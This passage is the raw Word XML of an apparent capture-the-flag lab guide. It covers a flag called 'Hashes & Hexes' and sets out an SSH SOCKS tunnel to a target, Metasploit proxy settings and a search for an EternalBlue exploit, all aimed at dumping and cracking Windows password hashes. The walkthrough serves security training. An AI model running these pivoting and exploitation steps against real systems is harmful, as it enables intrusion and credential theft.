        <w:ind w:left="1685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me.txt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ntai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e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XR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Y #2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4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601</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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ientX_2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4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601.jpg -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ins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hi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 evi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en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e of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(00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0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000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3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7.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x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00000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1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09.x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sx)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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00000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1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09.x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sx c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ntai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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3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 –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FLA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G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{x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y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_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_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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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01-05-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2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5.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y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ci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o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he </w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE01E5">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE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: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’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is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ub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or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—b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ut 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y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e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sn’t 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eed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="24"/>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId29"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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 be c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k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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 4 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Ha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>s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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>es &amp;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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>exes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1301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Ex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p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loit an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u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p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at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hed internal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y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tem to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u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m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p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 xml:space="preserve"> p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as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w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ord hash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. Perform offline ha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h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ra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king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to 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x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tra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t u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b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le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redenti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4"/>
          <w:szCs w:val="24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ls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and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p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ture the ne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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>x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t fl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g from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mp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ro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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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ed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ou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t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at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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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et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sp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 xml:space="preserve">oit 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et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AP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 xml:space="preserve">I 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xp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oit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 xml:space="preserve">– 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o exploit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">n 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np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Windo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w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XP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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st</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ete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eter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 xml:space="preserve">– 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mp l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oc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 xml:space="preserve">l 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ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w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ord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sh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 xml:space="preserve"> f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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om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mp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om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spacing w:val="-3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ne</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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J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n t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 xml:space="preserve">e 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ip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 xml:space="preserve">er – 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crack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pa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sword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hes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line</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Ha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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y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sis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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–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ete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ine w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spacing w:val="-3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ch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spacing w:val="-3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 xml:space="preserve"> a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crack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le</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="11" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Laun</w:t>
      </w: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 xml:space="preserve">h the </w:t>
      </w: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>xp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 xml:space="preserve">loit </w:t>
      </w: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A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t</w:t>
      </w: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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3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>mp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ts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In 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K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li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ermi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l,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he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SS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H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un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el:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">D 1080 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>N moo@&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="180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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open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et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sp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oit wi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3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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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In the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et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sp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oit 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sole, c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g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ure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pr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ox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y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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>setg Proxies socks5:127.0.0.1:1080</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Att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empt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 exploit 1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7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2.31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.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1.14 (Wi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w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1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0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)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ng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Et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ern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lBl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 (o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 line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ch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):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>search exploit eternal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
